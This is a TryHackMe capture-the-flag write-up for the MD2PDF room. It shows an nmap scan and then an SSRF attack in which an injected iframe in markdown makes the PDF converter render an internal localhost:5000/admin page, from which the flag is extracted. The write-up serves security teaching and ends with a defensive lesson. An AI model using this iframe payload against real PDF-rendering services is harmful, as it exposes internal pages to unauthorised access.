---
title: "MD2PDF — TryHackMe Writeup"
description: "SSRF via HTML injection in PDF generation — exploiting a markdown-to-PDF converter on TryHackMe."
date: "2025-06-15"
tags: ["tryhackme", "ssrf", "web-exploitation", "pdf-injection"]
image: "/images/md2pdf-card.svg"
slug: "md2pdf-thm-writeup"
---

# MD2PDF — TryHackMe Writeup

**Room:** [MD2PDF](https://tryhackme.com/room/md2pdf)
**Difficulty:** Easy
**Category:** Web Exploitation (SSRF)

---

## Reconnaissance

```
nmap -sC -sV -p- <target_ip>
```

**Open ports:**
| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP (MD2PDF web app) |
| 5000 | HTTP (MD2PDF internal) |

---

## Enumeration

Visiting `/admin` on both ports returns a 403:

```
curl -s http://<target_ip>/admin
> Forbidden — This page can only be seen internally (localhost:5000)
```

The app converts markdown to PDF via a `/convert` endpoint. This is vulnerable to **SSRF** — we can inject HTML that forces the server to fetch internal resources and render them into the PDF.

---

## Exploitation

Inject an `<iframe>` pointing to the internal admin page:

```bash
curl -s -X POST http://<target_ip>/convert \
  -d "md=<iframe src='http://localhost:5000/admin' width='800' height='600'></iframe>" \
  -o output.pdf
```

Extract the flag:

```bash
strings output.pdf | grep -i THM
```

The flag is rendered inside the PDF.

---

## Key Takeaway

**SSRF via HTML injection in PDF generation.** Always sanitize user input when converting markdown/HTML to PDF — especially block internal/localhost requests.
